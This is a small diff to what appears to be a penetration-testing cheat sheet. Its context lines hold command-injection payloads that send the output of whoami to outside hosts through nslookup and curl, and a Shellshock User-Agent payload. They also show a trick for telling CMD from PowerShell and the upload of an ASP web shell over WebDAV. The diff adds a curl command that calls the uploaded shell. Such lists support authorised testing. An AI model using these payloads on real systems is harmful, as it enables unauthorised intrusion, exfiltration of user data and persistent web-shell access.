@@ -513,7 +513,7 @@ nslookup `whoami`.attacker-server.com &
 curl http://192.168.0.20/$(whoami)
 ```
 
--> Check if the commands are executed by PowerShell or CMD.
+-> Check if the commands are executed by PowerShell or CMD
 ```
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
@@ -536,5 +536,8 @@ curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
 ```
 cadaver http://<IP>/webdav
 put <shell.asp>
+```
+```
+curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
 ```
 https://github.com/notroj/cadaver
